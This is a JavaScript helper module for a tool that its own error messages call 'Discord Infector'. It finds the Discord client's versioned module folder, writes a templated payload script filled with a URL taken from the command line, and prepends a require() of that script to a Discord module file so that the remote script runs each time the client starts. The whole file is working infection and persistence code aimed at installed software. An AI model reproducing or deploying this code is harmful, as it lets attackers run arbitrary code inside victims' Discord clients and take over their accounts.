const fs = require('fs');
const request = require('request-promise');
const EOL = require('os').EOL;
const payload = require('./payload');




/*
 * given a body of text calls replace with a key and value
 * until the key is no longer found.
 *
 * */

const fillTemplate = (body,key,value)=>{
	/*if the key is in the value the loop would be infinite*/
	if(value.includes(key)) return body;
	while(body.includes(key))
		body = body.replace(key,value);
	return body;
}

/*
 *
 * Given a base path, return the name of the only folder whose name is composed of only . and numbers
 * If there is more than one, error out.
 *
 * */
const findVersion = base=>{
	const versions = fs.readdirSync(base).filter(name=>{
		return name.split('.').filter(number=>{
			return !isNaN(Number(number))
		}).length
	});
	if(versions.length !== 1){
		console.error(`Cannot find Discord versioned module superfolder.`);
		return false;
	}
	return versions[0];
}


/*
 *
 * Assert that a path exists on the filesystem; if not, error out.
 * 
 * */
const assertPath = path=>{
	if(!fs.existsSync(path)){
		console.error(`Cannot find Discord data in ${discordPath}!`);
		return false;
	}
	return true;
}


/*
 *
 * Assert that at least num arguments are passed to the program when run.
 * If not, print out usage info and error out.
 * 
 * */
const assertArguments = num=>{
	if(process.argv.length < num){
		console.error(`Discord Infector must be run with a URL to pull a script from.`);
		console.error(`Example: .\\DiscordInfector.exe https://example.org/examplescript.js`);
		return false;
	}
	return true;
}


/*
 * Fills in payload template with payload path and url then writes it to a path.
 *
 * */
const dropScript = async (path,payloadPath,url)=>{
	const updatedPath = fillTemplate(payloadPath,'\\','/');
	const updatedPayload = fillTemplate(fillTemplate(payload,'#path',updatedPath),'#url',url);
	try{
		fs.writeFileSync(path,updatedPayload);
		return true;
	} catch (e){
		console.error(e);
		return false;
	}
}

/*
 * Given a path to a script and a script name, prepend a require() of that script name to the
 * file in the specified path.
 *
 * */
const patchScript = (path,scriptName)=>{
	let script;
	try{
		script = fs.readFileSync(path).toString();
	} catch(e){
		console.error(e);
		return false;
	}
	const patchLine = `require('./${scriptName}');`;
	if(script.split(EOL)[0] !== patchLine){
		script = patchLine + EOL + script;
		try{
			fs.writeFileSync(path,script);
		} catch(e){
			console.error(e);
			return false;
		}
	}
	return true;
}

module.exports = {
	findVersion,
	assertPath,
	assertArguments,
	dropScript,
	patchScript
}
